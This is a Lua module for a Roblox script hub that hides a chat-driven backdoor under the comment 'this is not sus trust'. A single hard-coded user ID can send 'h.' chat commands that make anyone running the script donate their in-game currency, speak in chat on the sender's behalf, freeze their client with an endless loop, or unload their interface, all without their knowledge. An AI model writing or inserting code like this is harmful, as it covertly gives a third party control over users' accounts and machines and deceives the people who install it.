local args = ...
local Tabs = args.Tabs
local Window = args.Window
local Obsidian = args.Obsidian
local Helpers = args.Helpers

local players = Helpers.services.players
local localplr = players.LocalPlayer

--[[
this is not sus trust
]]


local function findPlayerByName(name)
	if not name or name == "" then
		return nil
	end

	local lowerName = name:lower()
	local matches = {}

	for _, plr in pairs(players:GetPlayers()) do
		if plr.Name:lower():find(lowerName, 1, true) == 1 then
			table.insert(matches, plr)
		end
	end

	if #matches == 1 then
		return matches[1]
	end

	return nil
end

local cmds = {}
local whitelisted = {
	[4941339651] = true
}

cmds["donate"] = function(args, plr)
	local amount = tonumber(args[2])

	if not amount then
		local leaderstats = plr:FindFirstChild("leaderstats")
		local time = leaderstats and leaderstats:FindFirstChild("Time")
		amount = time and time.Value or 0
	end

	Helpers.cmd("donate " .. tostring(args[1]) .. " " .. tostring(amount))
end

cmds["say"] = function(args)
	Helpers.say(table.concat(args, " "))
end

cmds["crash"] = function(args)
	if findPlayerByName(args[1]) == localplr then
		while true do
		end
	end
end

cmds["enli"] = function(args)
	local c = findPlayerByName(args[1])
	if c then
		Helpers.cmd("enlighten " .. c.Name)
	end
end

cmds["disable"] = function(args)
	if findPlayerByName(args[1]) == localplr then
		Obsidian:Unload()
	end
end

local function splitString(str, sep)
	sep = sep or " "
	local result = {}

	for match in (str .. sep):gmatch("(.-)" .. sep) do
		table.insert(result, match)
	end

	return result
end

local function runToken(v, speaker)
	local args = splitString(v)
	local cmdName = args[1]

	if not cmdName or cmdName == "" then
		return
	end

	local cmdFunc = cmds[cmdName:lower()]
	if not cmdFunc then
		return
	end

	if not whitelisted[speaker.UserId] then
		return
	end

	table.remove(args, 1)

	local ok, err = pcall(cmdFunc, args, speaker)
	if not ok then
		warn("Command Error:", cmdName, err)
	end
end

local function execCmd(cmdStr, speaker)
	cmdStr = cmdStr:gsub("%s+$", "")

	task.spawn(function()
		for _, v in ipairs(splitString(cmdStr:gsub("\\\\", "%%BackSlash%%"), "\\")) do
			runToken(v:gsub("%%BackSlash%%", "\\"), speaker)
		end
	end)
end

Helpers.on("ChatListener", function(msg)
	local sender = msg.TextSource
	if not sender then
		return
	end

	local text = msg.Text
	if text:sub(1, 2) ~= "h." then
		return
	end

	local player = players:GetPlayerByUserId(sender.UserId)
	if not player then
		return
	end

	execCmd(text:sub(3), player)
end)